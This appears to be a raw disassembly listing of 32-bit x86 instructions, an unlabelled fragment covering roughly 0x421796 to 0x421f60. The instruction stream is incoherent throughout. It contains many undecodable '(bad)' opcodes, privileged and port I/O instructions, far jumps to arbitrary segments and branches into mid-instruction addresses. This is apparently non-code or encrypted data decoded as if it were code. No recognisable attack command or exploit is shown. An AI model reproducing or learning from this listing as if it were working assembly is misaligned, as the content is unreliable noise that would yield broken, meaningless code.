  421796:	imul   edx,DWORD PTR [ebx-0x5b34f923],0x27
  42179d:	cld    
  42179e:	ror    BYTE PTR [ebx+0x66856c5d],0x9d
  4217a5:	test   BYTE PTR [ecx],dl
  4217a7:	out    dx,al
  4217a8:	jb     0x42175a
  4217aa:	fbstp  TBYTE PTR [edx+0x8537401]
  4217b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217b1:	pop    ecx
  4217b2:	sbb    eax,0x4ebb6d51
  4217b7:	pop    esp
  4217b8:	addr16 retf 
  4217ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217bb:	stos   BYTE PTR es:[edi],al
  4217bc:	sti    
  4217bd:	add    BYTE PTR [ebx+0x1c],al
  4217c0:	mul    DWORD PTR [esi+edx*1+0x3]
  4217c4:	dec    edx
  4217c5:	clc    
  4217c6:	pusha  
  4217c7:	pop    ecx
  4217c8:	and    eax,0xbbbc91f1
  4217cd:	sbb    eax,0x40f26051
  4217d2:	sbb    cl,al
  4217d4:	test   BYTE PTR [edi+0x1],dl
  4217d7:	sbb    edx,DWORD PTR [edx-0x404ede83]
  4217dd:	jne    0x421846
  4217df:	adc    dh,dl
  4217e1:	test   eax,0x7d7737c0
  4217e6:	ins    DWORD PTR es:[edi],dx
  4217e7:	mov    bl,0xee
  4217e9:	pushf  
  4217ea:	mov    esp,0xde9e40f3
  4217ef:	sbb    eax,0x2947b7fc
  4217f4:	jbe    0x42184c
  4217f6:	daa    
  4217f7:	test   esi,ebp
  4217f9:	fsubr  QWORD PTR [edi+0x18]
  4217fc:	jns    0x4217b9
  4217fe:	push   0x33
  421800:	scas   al,BYTE PTR es:[edi]
  421801:	mov    edx,DWORD PTR [edx+0x70]
  421804:	xchg   edx,eax
  421805:	aad    0xd
  421807:	jns    0x42183e
  421809:	repnz (bad) 
  42180b:	and    eax,0x56e0e81b
  421810:	and    al,0x7e
  421812:	cwde   
  421813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421814:	pop    esp
  421815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421816:	push   0x7d
  421818:	pop    ebp
  421819:	icebp  
  42181a:	pop    ebx
  42181b:	gs mov dl,0xbe
  42181e:	sub    edx,DWORD PTR [ebx-0x5b]
  421821:	dec    esp
  421822:	(bad)  
  421823:	mov    WORD PTR [edx],ds
  421825:	scas   al,BYTE PTR es:[edi]
  421826:	push   ds
  421827:	jmp    0xacd0:0x83e1236d
  42182e:	mov    ebx,0x2c7b2135
  421833:	push   ecx
  421834:	sbb    DWORD PTR [esi*1+0x36ad1d77],eax
  42183b:	imul   esp,esi,0x65907a0d
  421841:	xchg   esi,edx
  421843:	inc    ecx
  421844:	inc    ecx
  421845:	jo     0x4217ed
  421847:	(bad)  
  421848:	shr    BYTE PTR [edx-0x1eae1f0c],0xd
  42184f:	cmp    ebp,ecx
  421851:	ins    BYTE PTR es:[edi],dx
  421852:	call   0x96ba:0x11b9cb71
  421859:	jmp    0x19af:0x7be9b597
  421860:	outs   dx,BYTE PTR ds:[esi]
  421861:	gs add eax,0x37661dd1
  421867:	push   eax
  421868:	jno    0x42187e
  42186a:	mov    DWORD PTR [esi],esp
  42186c:	or     BYTE PTR [eax-0x39],0xe5
  421870:	inc    ecx
  421871:	outs   dx,DWORD PTR ds:[esi]
  421872:	in     eax,dx
  421873:	pop    eax
  421874:	mov    BYTE PTR [esi+0x11],0xb6
  421878:	fnstenv [ebp-0x36]
  42187b:	rcl    DWORD PTR [edi+eiz*2+0x4e],cl
  42187f:	lock sbb DWORD PTR [ecx],edi
  421882:	hlt    
  421883:	cwde   
  421884:	cmp    bl,BYTE PTR [esp]
  421887:	leave  
  421888:	ja     0x42184a
  42188a:	pop    esi
  42188b:	mov    cs,WORD PTR [ebx-0x181e85ce]
  421891:	in     al,0x9b
  421893:	or     esp,DWORD PTR [esi-0x74cc0ff4]
  421899:	pop    esp
  42189a:	addr16 jmp 0xfda010be
  4218a0:	inc    eax
  4218a1:	sbb    BYTE PTR [ebx],bh
  4218a3:	or     bl,BYTE PTR [edx]
  4218a5:	push   ebx
  4218a6:	and    BYTE PTR [ecx-0x3d],ch
  4218a9:	jl     0x421856
  4218ab:	dec    edx
  4218ac:	fwait
  4218ad:	push   ebx
  4218ae:	lods   eax,DWORD PTR ds:[esi]
  4218af:	mov    esi,0xee82e52a
  4218b4:	mov    esi,0x604de4f0
  4218b9:	mov    edx,0xf04c91f5
  4218be:	add    BYTE PTR ds:0xec6e40c1,ah
  4218c4:	mov    edx,0x4161d2ea
  4218c9:	dec    ecx
  4218ca:	mov    ds:0xfbcd5a7c,al
  4218cf:	shl    dh,cl
  4218d1:	sbb    dh,BYTE PTR [ecx+0x59c11d26]
  4218d7:	xchg   dh,cl
  4218d9:	test   eax,0x82e4bd94
  4218de:	push   ebp
  4218df:	inc    esi
  4218e1:	xlat   BYTE PTR gs:[ebx]
  4218e3:	aam    0xcc
  4218e5:	pop    esp
  4218e6:	out    dx,eax
  4218e7:	jo     0x421912
  4218e9:	pop    ss
  4218ea:	mov    BYTE PTR [ecx+0x420920eb],ch
  4218f0:	or     al,ch
  4218f2:	xor    al,0x61
  4218f4:	pop    ecx
  4218f5:	cmp    BYTE PTR [ebx],ah
  4218f7:	fstp   st(1)
  4218f9:	scas   eax,DWORD PTR es:[edi]
  4218fa:	xor    BYTE PTR [ebp-0x7508074f],0x1
  421901:	ja     0x4218cf
  421903:	repz cli 
  421905:	ror    BYTE PTR ds:0x90d5378e,1
  42190b:	or     DWORD PTR [edi+0x77],esp
  42190e:	adc    BYTE PTR ds:0x682d9376,cl
  421914:	cli    
  421915:	sgdtd  [ebx+ecx*4+0x3a]
  42191a:	mov    bh,0x1b
  42191c:	xor    edx,DWORD PTR [ebx+0x346eb1f0]
  421922:	test   al,0xe5
  421924:	aam    0xe3
  421926:	jns    0x4218ea
  421928:	in     eax,dx
  421929:	sbb    eax,0x4283665e
  42192e:	xchg   BYTE PTR [ebp-0x7a],ah
  421931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421932:	das    
  421933:	add    DWORD PTR [ecx+0x558b0980],esi
  421939:	mov    eax,ds:0x3c5e4df4
  42193e:	js     0x4218d8
  421940:	jnp    0x42196d
  421942:	sub    esi,ebx
  421944:	jo     0x42199a
  421946:	icebp  
  421947:	sub    al,0x78
  421949:	mov    ebx,0x6124f8a1
  42194e:	push   cs
  42194f:	jbe    0x4219cd
  421951:	sbb    DWORD PTR [edx],0x34109be2
  421957:	(bad)
  42195a:	scas   eax,DWORD PTR es:[edi]
  42195b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42195c:	jp     0x421928
  42195e:	add    al,0xed
  421960:	add    BYTE PTR [eax+ecx*1-0xc],ah
  421964:	pop    edx
  421965:	add    al,BYTE PTR [eax-0x4a152dfe]
  42196b:	xor    al,0xcc
  42196d:	call   0xb02f:0x38864568
  421974:	fist   DWORD PTR [ebx-0x14]
  421977:	out    dx,al
  421978:	jge    0x421972
  42197a:	jmp    0x5292d8ec
  42197f:	inc    ebx
  421980:	out    0x37,eax
  421982:	sbb    eax,0xbfccc22
  421987:	xlat   BYTE PTR ds:[ebx]
  421988:	jle    0x4219eb
  42198a:	mov    al,ds:0xd073d7fd
  42198f:	push   esi
  421990:	xchg   edi,eax
  421991:	xchg   edi,eax
  421992:	jne    0x421941
  421994:	int    0x92
  421996:	fldenv [esi]
  421998:	(bad)  
  421999:	ficom  DWORD PTR [esi-0x17]
  42199c:	jmp    0x4219a2
  42199e:	cmp    bh,dl
  4219a0:	mov    ch,0xc2
  4219a2:	ret    0x3dba
  4219a5:	in     eax,dx
  4219a6:	or     DWORD PTR [esi+ebp*1+0x3ebff8f5],ebx
  4219ad:	jo     0x4219ce
  4219af:	or     BYTE PTR [esi-0x6930eb45],bl
  4219b5:	into   
  4219b6:	leave  
  4219b7:	pop    esp
  4219b8:	inc    eax
  4219b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219ba:	sub    eax,0x3576b116
  4219bf:	sub    DWORD PTR [ecx],ecx
  4219c1:	scas   eax,DWORD PTR es:[edi]
  4219c2:	das    
  4219c3:	dec    edx
  4219c4:	push   cs
  4219c5:	inc    eax
  4219c6:	loope  0x421999
  4219c8:	xchg   esp,eax
  4219c9:	add    DWORD PTR [edi],ebx
  4219cb:	adc    ecx,edx
  4219cd:	push   esi
  4219ce:	int3   
  4219cf:	mov    ebx,0x4806d74f
  4219d4:	jno    0x4219e2
  4219d6:	jmp    0xf00b:0xdbacfae8
  4219dd:	push   ss
  4219de:	repnz rcr esi,cl
  4219e1:	jnp    0x421a1f
  4219e3:	fsubr  QWORD PTR [eax+0x61]
  4219e6:	xor    BYTE PTR [ebp+0x205f4192],bh
  4219ec:	jae    0x4219a8
  4219ee:	ret    
  4219ef:	dec    eax
  4219f0:	add    eax,0x9b307fb4
  4219f5:	dec    ebp
  4219f6:	leave  
  4219f7:	mov    bh,0x67
  4219f9:	ret    0x6df0
  4219fc:	and    dl,bl
  4219fe:	repnz adc dh,0x2d
  421a02:	pop    edi
  421a03:	cmp    eax,0x48db032e
  421a08:	lds    eax,FWORD PTR [edi+0x68d2ad43]
  421a0e:	sbb    al,0xe1
  421a10:	sub    DWORD PTR [ebx-0x38fa9bad],ebx
  421a16:	push   esi
  421a17:	mov    ebx,0xf0917548
  421a1c:	mov    eax,0x87b17dc2
  421a21:	es or  al,0x50
  421a24:	(bad)  
  421a26:	mov    ebx,0x6359c90d
  421a2b:	sub    dl,dh
  421a2d:	mov    al,0xd6
  421a2f:	ss jnp 0x4219fb
  421a32:	inc    edx
  421a33:	xor    al,ch
  421a35:	sub    esi,DWORD PTR gs:[edi-0x76]
  421a39:	ja     0x421a7a
  421a3b:	cmp    BYTE PTR [eax-0x5e72779],ah
  421a41:	and    ebp,DWORD PTR [ebx+edx*4+0x6b]
  421a45:	inc    esi
  421a46:	aas    
  421a47:	rcl    eax,cl
  421a49:	and    al,bh
  421a4b:	jge    0x421a7b
  421a4d:	sub    BYTE PTR [eax],al
  421a4f:	mov    cs,esi
  421a51:	add    eax,0x2022e169
  421a56:	jo     0x421a69
  421a58:	mov    bl,0x4f
  421a5a:	xchg   DWORD PTR [eax-0x7547ac15],ebp
  421a60:	xchg   ebx,eax
  421a61:	or     al,BYTE PTR [esi+0x5487cf35]
  421a67:	int    0xe
  421a69:	bnd je 0x421aca
  421a6c:	xchg   BYTE PTR [edx+0x52],bh
  421a6f:	jg     0x421a03
  421a71:	int    0x5d
  421a73:	jge    0x421aad
  421a75:	aas    
  421a76:	mov    WORD PTR [ebx+0x1fc50d88],es
  421a7c:	(bad)
  421a7f:	inc    esp
  421a80:	pop    eax
  421a81:	test   BYTE PTR [ebx-0x298c3ee8],ch
  421a87:	mov    ebx,0x6e5c0af2
  421a8c:	inc    esi
  421a8d:	inc    ebx
  421a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a8f:	cli    
  421a90:	inc    eax
  421a91:	ret    
  421a92:	push   cs
  421a93:	loope  0x421aad
  421a95:	mul    DWORD PTR [eax+0x154af989]
  421a9b:	pop    es
  421a9c:	test   ch,ch
  421a9e:	jb     0x421a4a
  421aa0:	out    dx,al
  421aa1:	cwde   
  421aa2:	jmp    0x421a39
  421aa4:	fisubr WORD PTR [ecx+ebp*8-0x5]
  421aa8:	ret    
  421aa9:	cld    
  421aaa:	lods   al,BYTE PTR ds:[esi]
  421aab:	mov    eax,ds:0x3da79d04
  421ab0:	jb     0x7d421d9a
  421ab6:	bound  ebx,QWORD PTR [esi+0x5d56271]
  421abc:	outs   dx,BYTE PTR ds:[esi]
  421abd:	mov    eax,DWORD PTR [ecx+0xd]
  421ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ac1:	sub    eax,0x561f5754
  421ac6:	xchg   ebx,eax
  421ac7:	add    al,0x2b
  421ac9:	ins    BYTE PTR es:[edi],dx
  421aca:	sbb    bl,bl
  421acc:	retf   
  421acd:	test   DWORD PTR [eax-0x58722208],esp
  421ad3:	test   al,0x77
  421ad5:	xchg   ebx,eax
  421ad6:	adc    ah,BYTE PTR [ebx-0x1a]
  421ad9:	idiv   ebp
  421adb:	ret    0x96fb
  421ade:	nop
  421adf:	adc    BYTE PTR [edx-0x10],dh
  421ae2:	xchg   esi,eax
  421ae3:	repnz iret 
  421ae5:	in     al,dx
  421ae6:	ins    DWORD PTR es:[edi],dx
  421ae7:	push   ss
  421ae8:	xor    cl,ah
  421aea:	repz and al,0x76
  421aed:	test   eax,0xeea407ba
  421af2:	pop    esi
  421af3:	ja     0x421af6
  421af5:	push   ebx
  421af6:	push   ecx
  421af7:	int    0xd9
  421af9:	xor    al,0xa9
  421afb:	aaa    
  421afc:	retf   
  421afd:	rcl    BYTE PTR [ebx+0x695299e5],cl
  421b03:	mov    ch,0x63
  421b05:	imul   BYTE PTR [edi-0x8]
  421b08:	mov    ah,0xd6
  421b0a:	push   edx
  421b0b:	sbb    ch,BYTE PTR [edx]
  421b0d:	pop    esi
  421b0e:	in     al,dx
  421b0f:	inc    ebx
  421b10:	imul   edi,DWORD PTR [edi-0x71],0x128eebbd
  421b17:	add    BYTE PTR [edx],bl
  421b19:	mov    ebp,0xbfeb2be4
  421b1e:	add    esi,esp
  421b20:	pop    ds
  421b21:	mov    edx,DWORD PTR [eax]
  421b23:	das    
  421b24:	leave  
  421b25:	inc    eax
  421b26:	pushf  
  421b27:	mov    edx,0x87e33fa0
  421b2c:	or     ch,ah
  421b2e:	std    
  421b2f:	std    
  421b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b31:	stc    
  421b32:	js     0x421acd
  421b34:	stos   DWORD PTR es:[edi],eax
  421b35:	ins    BYTE PTR es:[edi],dx
  421b36:	pop    es
  421b37:	add    eax,DWORD PTR [edi-0x58048fac]
  421b3d:	dec    ebp
  421b3e:	pop    ds
  421b3f:	leave  
  421b40:	cs ja  0x421aec
  421b43:	mov    BYTE PTR [esi+ebx*4-0x6eb73f3b],bh
  421b4a:	xor    BYTE PTR [ebp+0x29fdb44c],dl
  421b50:	push   0x1
  421b52:	ja     0x421b05
  421b54:	pop    ds
  421b55:	pop    edi
  421b56:	fmul   st(5),st
  421b58:	sbb    cl,ch
  421b5a:	mov    al,0xd8
  421b5c:	aaa    
  421b5d:	xchg   ebp,eax
  421b5e:	int    0x51
  421b60:	and    edi,eax
  421b62:	std    
  421b63:	fsub   DWORD PTR [ecx]
  421b65:	fst    QWORD PTR ds:0x373836ef
  421b6b:	test   BYTE PTR [eax],ch
  421b6d:	jo     0x421b95
  421b6f:	mov    ah,0x5f
  421b71:	add    al,0xaf
  421b73:	mov    ecx,DWORD PTR [ecx]
  421b75:	cmp    DWORD PTR [edx+0x38],0x5c1dfda2
  421b7c:	push   edx
  421b7d:	cmp    BYTE PTR [ebp+0x4d],bl
  421b80:	xchg   esp,eax
  421b81:	mov    ebp,0xbf8ae041
  421b86:	leave  
  421b87:	pop    esi
  421b88:	sub    esp,DWORD PTR [edx]
  421b8a:	pop    edi
  421b8b:	(bad)  
  421b8c:	fwait
  421b8d:	sub    ah,bl
  421b8f:	ins    BYTE PTR es:[edi],dx
  421b90:	xor    ecx,DWORD PTR [edi+0x7db6eeb1]
  421b96:	jbe    0x421b92
  421b98:	pop    ecx
  421b99:	stos   DWORD PTR es:[edi],eax
  421b9a:	add    DWORD PTR [eax],ebp
  421b9c:	jle    0x421bae
  421b9e:	(bad)
  421ba1:	and    al,0xc5
  421ba3:	add    BYTE PTR [ebx-0x5379a903],0xb4
  421baa:	push   0x829d9890
  421baf:	outs   dx,DWORD PTR ds:[esi]
  421bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bb1:	in     al,dx
  421bb2:	push   ecx
  421bb3:	and    esp,ebx
  421bb5:	mov    eax,0x336bdb2
  421bba:	int3   
  421bbb:	fdivrp st(4),st
  421bbd:	outs   dx,DWORD PTR ds:[esi]
  421bbe:	arpl   WORD PTR [ecx+ebp*4-0x13],cx
  421bc2:	inc    esi
  421bc3:	mov    ecx,0x6520192
  421bc8:	add    edi,0xffffff8d
  421bcb:	add    eax,0xf9ec47be
  421bd0:	test   BYTE PTR [esi+eax*1],cl
  421bd3:	xor    edi,DWORD PTR [esi-0x52778721]
  421bd9:	inc    ebp
  421bda:	dec    ecx
  421bdb:	fwait
  421bdc:	mov    eax,ds:0x7c62431a
  421be1:	inc    esi
  421be2:	ins    BYTE PTR es:[edi],dx
  421be3:	jne    0x421bf8
  421be5:	jmp    0x9428041a
  421bea:	gs jle 0x421bc1
  421bed:	dec    ebx
  421bee:	inc    eax
  421bef:	mov    al,ds:0xef2b0040
  421bf4:	fsubr  QWORD PTR [eax]
  421bf6:	pop    edi
  421bf7:	cmp    DWORD PTR [edi],0xdba557e9
  421bfd:	pop    edx
  421bfe:	in     eax,dx
  421bff:	xor    BYTE PTR [edx-0x55],cl
  421c02:	xor    bh,BYTE PTR [edi+0x14]
  421c05:	xor    ch,BYTE PTR [esi+ebp*8+0x2e22d38a]
  421c0c:	inc    edi
  421c0d:	xor    dh,BYTE PTR [ecx]
  421c0f:	or     ebp,DWORD PTR [edi-0x61]
  421c12:	mov    ch,0xd8
  421c14:	jge    0x421c37
  421c16:	pop    eax
  421c17:	outs   dx,BYTE PTR ds:[esi]
  421c18:	ret    
  421c19:	shl    BYTE PTR [esi-0x74905efe],1
  421c1f:	idiv   DWORD PTR [edi+0x23e01c49]
  421c25:	test   BYTE PTR [ebp+0x619db4aa],dl
  421c2b:	jle    0x421c10
  421c2d:	cli    
  421c2e:	bound  esi,QWORD PTR [ebp-0xfead3b7]
  421c34:	sub    DWORD PTR [eax+0x22e8bcdb],0xffffffcd
  421c3b:	fsub   QWORD PTR [edi]
  421c3d:	sub    al,0xd5
  421c3f:	or     edi,ebp
  421c41:	clc    
  421c42:	jmp    DWORD PTR [esi-0x68]
  421c45:	dec    ecx
  421c46:	mov    ecx,0x9ee724b1
  421c4b:	xchg   ecx,esi
  421c4d:	enter  0xa5cf,0x55
  421c51:	xor    ebp,edi
  421c53:	fwait
  421c54:	and    DWORD PTR [eax],esp
  421c56:	retf   
  421c57:	iret   
  421c58:	sbb    DWORD PTR [eax],edx
  421c5a:	ss fsub st,st(1)
  421c5d:	popf   
  421c5e:	shr    BYTE PTR [esi+0x77db990a],cl
  421c64:	mov    bh,0x85
  421c66:	mov    DWORD PTR cs:[eax+0x6238b7f6],esi
  421c6d:	jmp    FWORD PTR [eax+0x3cc8a907]
  421c73:	int    0xfe
  421c75:	adc    edi,esi
  421c77:	dec    ecx
  421c78:	inc    ebx
  421c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c7a:	jae    0x421c29
  421c7c:	push   eax
  421c7d:	daa    
  421c7e:	nop
  421c7f:	out    0x90,eax
  421c81:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  421c83:	jl     0x421ca4
  421c85:	inc    eax
  421c86:	lds    edi,FWORD PTR [ebx-0x13]
  421c89:	scas   eax,DWORD PTR es:[edi]
  421c8a:	ss mov edi,0x5b19974d
  421c90:	stos   DWORD PTR es:[edi],eax
  421c91:	sbb    BYTE PTR [eax],bl
  421c93:	fstp   QWORD PTR [esi-0x1bdada12]
  421c99:	imul   edx,DWORD PTR [edi],0x6fc9e6c7
  421c9f:	and    dl,dh
  421ca1:	out    0xf7,eax
  421ca3:	push   cs
  421ca4:	cmp    ecx,DWORD PTR [eax-0x2e337a3a]
  421caa:	int    0x80
  421cac:	push   cs
  421cad:	sub    DWORD PTR [eax+0x2fc36d28],esi
  421cb3:	sub    BYTE PTR [ebx-0x57],al
  421cb6:	xlat   BYTE PTR ds:[ebx]
  421cb7:	loope  0x421c6a
  421cb9:	pop    ebx
  421cba:	sbb    DWORD PTR [ebx+edx*2+0x55f5e611],eax
  421cc1:	fnstsw WORD PTR [ecx+0x2c163478]
  421cc7:	jg     0x421cba
  421cc9:	test   al,0xd3
  421ccb:	inc    esi
  421ccc:	(bad)  
  421ccd:	or     eax,0xa504615
  421cd2:	fwait
  421cd3:	jecxz  0x421c72
  421cd5:	jno    0x421c67
  421cd7:	dec    ebp
  421cd8:	lods   al,BYTE PTR ds:[esi]
  421cd9:	jge    0x421c86
  421cdb:	loopne 0x421d05
  421cdd:	push   eax
  421cde:	cld    
  421cdf:	mov    al,ds:0x7b186624
  421ce4:	cmp    BYTE PTR [ebx+ebp*4+0xa1bfe30],bh
  421ceb:	push   edi
  421cec:	mov    dl,0x83
  421cee:	inc    edi
  421cef:	(bad)  
  421cf0:	aas    
  421cf1:	mov    BYTE PTR [edx+0x27],bl
  421cf4:	sbb    al,0xdd
  421cf6:	ss mov eax,0x14bdbd9
  421cfc:	outs   dx,BYTE PTR ds:[esi]
  421cfd:	aam    0x9e
  421cff:	sbb    BYTE PTR [esi],dh
  421d01:	ficomp WORD PTR [edi]
  421d03:	loope  0x421d71
  421d05:	mov    ds:0xe7d85206,al
  421d0a:	into   
  421d0b:	add    edi,DWORD PTR [ebp+0x37]
  421d0e:	mov    edx,0xfd68add7
  421d13:	out    0xea,eax
  421d15:	loope  0x421ce6
  421d17:	sti    
  421d18:	inc    ebp
  421d19:	mov    bh,dh
  421d1b:	dec    esp
  421d1c:	jmp    0x9174:0xe19fd812
  421d23:	xchg   ebp,eax
  421d24:	xchg   ecx,eax
  421d25:	mov    al,0x41
  421d27:	and    DWORD PTR [eax-0x4],esi
  421d2a:	cdq    
  421d2b:	cmp    al,cl
  421d2d:	sbb    al,0x38
  421d2f:	call   0x261d:0x94cc94c8
  421d36:	pop    esp
  421d37:	mov    DWORD PTR [ecx+0x2b53ceb6],esi
  421d3d:	cdq    
  421d3e:	xchg   ebx,eax
  421d3f:	xchg   ebx,eax
  421d40:	loopne 0x421cfd
  421d42:	out    0x1,al
  421d44:	aas    
  421d45:	mov    bl,0x9e
  421d47:	dec    ebp
  421d48:	push   cs
  421d49:	pop    sp
  421d4b:	dec    ebp
  421d4c:	push   esp
  421d4d:	and    eax,0x742e3760
  421d52:	xor    DWORD PTR [ebp+0x6a7f9854],0x0
  421d59:	mov    ebp,0xc23160f6
  421d5e:	arpl   ax,ax
  421d60:	repnz fbld TBYTE PTR [edi-0x4f836d8c]
  421d67:	mov    BYTE PTR [ebp+0x33c2b883],dh
  421d6d:	ds or  eax,0x751b823
  421d73:	xchg   edx,eax
  421d74:	xor    al,0xb2
  421d76:	cmp    DWORD PTR [ecx-0x56],0x5159634e
  421d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d7e:	add    eax,0x39c2d6bb
  421d83:	test   BYTE PTR [ebp+0x4f47bccd],bh
  421d89:	inc    ecx
  421d8a:	stos   DWORD PTR es:[edi],eax
  421d8b:	push   cs
  421d8c:	mov    ebx,0xff924c76
  421d91:	push   ecx
  421d92:	js     0x421d91
  421d94:	or     eax,0xb31e4b96
  421d99:	in     eax,0x96
  421d9b:	mov    edx,0xa4e8bb86
  421da0:	mov    cl,0xdf
  421da2:	xor    ebx,ecx
  421da4:	test   al,0xd2
  421da6:	cmp    eax,0x342a1ce8
  421dab:	(bad)  
  421dac:	stc    
  421dad:	mov    esp,0xb0127802
  421db2:	mov    ds:0x6c6ff7c5,al
  421db7:	out    0x24,eax
  421db9:	sub    cl,BYTE PTR [edx]
  421dbb:	fistp  QWORD PTR [ebx-0x69ffc976]
  421dc1:	jmp    DWORD PTR [edi]
  421dc3:	xor    bh,dl
  421dc5:	xchg   ebx,eax
  421dc6:	test   BYTE PTR [ebx],bh
  421dc8:	pop    ss
  421dc9:	hlt    
  421dca:	fwait
  421dcb:	mov    ebx,0x63398233
  421dd0:	loop   0x421e08
  421dd2:	push   esp
  421dd3:	cwde   
  421dd4:	ins    DWORD PTR es:[edi],dx
  421dd5:	push   0x33967774
  421dda:	aad    0xd4
  421ddc:	sbb    DWORD PTR [edx-0xbe1f37],edx
  421de2:	retf   
  421de3:	pusha  
  421de4:	lds    edx,FWORD PTR [eax]
  421de6:	arpl   WORD PTR [edx],dx
  421de8:	jnp    0x421e25
  421dea:	push   DWORD PTR [esi+0x641044b7]
  421df0:	movq   QWORD PTR [eax+0x32],mm4
  421df4:	adc    edi,edx
  421df6:	sbb    esi,edx
  421df8:	aam    0x39
  421dfa:	cdq    
  421dfb:	inc    esp
  421dfc:	pusha  
  421dfd:	out    dx,al
  421dfe:	xor    BYTE PTR [eax],bh
  421e00:	sbb    BYTE PTR [edi+0x34],al
  421e03:	xor    eax,0x7f60f491
  421e08:	xchg   esi,eax
  421e09:	dec    esp
  421e0a:	push   0xffffff8d
  421e0c:	push   ebp
  421e0d:	jmp    0x40678ec9
  421e12:	add    eax,edx
  421e14:	xchg   esp,eax
  421e15:	push   ebx
  421e16:	mov    bl,0x85
  421e18:	xchg   esi,eax
  421e19:	aam    0xd2
  421e1b:	imul   esp,edi,0x2f
  421e1e:	xlat   BYTE PTR ds:[ebx]
  421e1f:	xor    edx,DWORD PTR [edi-0x27]
  421e22:	mov    ?,esi
  421e24:	icebp  
  421e25:	jmp    0x421dc5
  421e27:	jo     0x421e9a
  421e29:	push   esp
  421e2a:	je     0x421de3
  421e2c:	adc    eax,0x7c4a7000
  421e31:	mov    bl,0xc
  421e33:	pusha  
  421e34:	jle    0x421e0a
  421e36:	push   ds
  421e37:	(bad)  
  421e38:	or     al,0x2c
  421e3a:	pop    eax
  421e3b:	add    eax,0xfa79c9a7
  421e40:	push   ss
  421e41:	dec    eax
  421e42:	and    al,0xfd
  421e44:	or     esi,ecx
  421e46:	dec    ebx
  421e47:	dec    esi
  421e48:	push   es
  421e49:	adc    al,0x9e
  421e4b:	jo     0x421ec8
  421e4d:	inc    ebp
  421e4e:	repnz or eax,0x7e4355cc
  421e54:	fwait
  421e55:	cdq    
  421e56:	or     eax,DWORD PTR [ebp-0x26]
  421e59:	mov    ds:0x82361621,al
  421e5e:	in     al,dx
  421e5f:	xchg   BYTE PTR [ebp-0x510aaae5],dl
  421e65:	les    esi,FWORD PTR [edi]
  421e67:	jmp    0x46ba:0xef14beef
  421e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e6f:	sub    DWORD PTR [eax+0x52576de6],esp
  421e75:	ffreep st(6)
  421e77:	gs sub eax,0x2b3adcf
  421e7d:	xchg   edx,eax
  421e7e:	ret    
  421e7f:	(bad)  [edi+eax*1-0x51]
  421e83:	pop    eax
  421e84:	mov    cl,0xc6
  421e86:	stos   DWORD PTR es:[edi],eax
  421e87:	or     bl,BYTE PTR [ebx-0x4f8230d5]
  421e8d:	std    
  421e8e:	mov    dh,0xf3
  421e90:	xor    DWORD PTR [ecx-0x13],edx
  421e93:	mov    ds:0xa23d92da,eax
  421e98:	popf   
  421e99:	(bad)  
  421e9a:	scas   eax,DWORD PTR es:[edi]
  421e9b:	fdivr  QWORD PTR es:[ebx+ebx*8]
  421e9f:	push   esp
  421ea0:	dec    edx
  421ea1:	mov    ds:0xbb8a5140,al
  421ea6:	dec    edx
  421ea7:	cdq    
  421ea8:	retf   0xf684
  421eab:	shl    ebx,0xe7
  421eae:	(bad)  
  421eaf:	loopne 0x421e42
  421eb1:	mov    bh,BYTE PTR [edi]
  421eb3:	gs jmp 0xeaa1a677
  421eb9:	popa   
  421eba:	add    ecx,DWORD PTR [ecx+0x1a]
  421ebd:	mov    bl,0xc7
  421ebf:	test   al,0xa3
  421ec1:	adc    BYTE PTR [ebp-0x18],ch
  421ec4:	mov    esi,0x3d4b624c
  421ec9:	jg     0x421eb7
  421ecb:	mov    edi,0xf9b196f
  421ed0:	ja     0x421e7e
  421ed2:	test   BYTE PTR [ecx-0x7a599acd],bl
  421ed8:	lds    ebp,FWORD PTR [ebx+eax*8]
  421edb:	or     al,dh
  421edd:	es push esi
  421edf:	pop    es
  421ee0:	push   ss
  421ee1:	mov    esp,0x8fb34dd4
  421ee6:	sahf   
  421ee7:	popf   
  421ee8:	mov    edx,DWORD PTR ds:0x9bd4e59f
  421eee:	mov    ds:0x3060c43f,al
  421ef3:	push   es
  421ef4:	retf   
  421ef5:	sub    DWORD PTR [edi+edx*2-0x235e6163],0xffffffde
  421efd:	inc    eax
  421efe:	int3   
  421eff:	adc    ah,dl
  421f01:	fdiv   st,st(1)
  421f03:	fst    st(0)
  421f05:	or     eax,DWORD PTR [esi-0x63]
  421f08:	jo     0x421f27
  421f0a:	retf   
  421f0b:	aad    0xf1
  421f0d:	call   0x44453642
  421f12:	inc    esp
  421f13:	jmp    DWORD PTR [esi-0x5dba9fc3]
  421f19:	sbb    ebp,ebx
  421f1b:	in     eax,dx
  421f1c:	imul   eax,DWORD PTR [edi-0x3d],0x65640e26
  421f23:	pop    edx
  421f24:	jo     0x421f1a
  421f26:	add    DWORD PTR [eax],ecx
  421f28:	(bad)  
  421f29:	out    0x7,al
  421f2b:	daa    
  421f2c:	cld    
  421f2d:	test   BYTE PTR [ebx-0x31],ch
  421f30:	mov    eax,0x983fa5b7
  421f35:	addr16 push eax
  421f37:	push   eax
  421f38:	les    esp,FWORD PTR [ecx+0x4c3b7362]
  421f3e:	dec    ebp
  421f3f:	jns    0x421f14
  421f41:	repz jg 0x421f2a
  421f44:	jne    0x421f46
  421f46:	test   al,0xa0
  421f48:	push   0xf672a8e8
  421f4d:	push   esi
  421f4e:	or     BYTE PTR [esi+0x64e58e07],0x55
  421f55:	test   BYTE PTR [edi+0x4],dh
  421f58:	or     eax,DWORD PTR [eax+0x3e]
  421f5b:	pop    ebp
  421f5c:	inc    DWORD PTR [edi-0x33]
  421f5f:	(bad)  
  421f60:	btr    DWORD PTR [ebx+eiz*8],esp
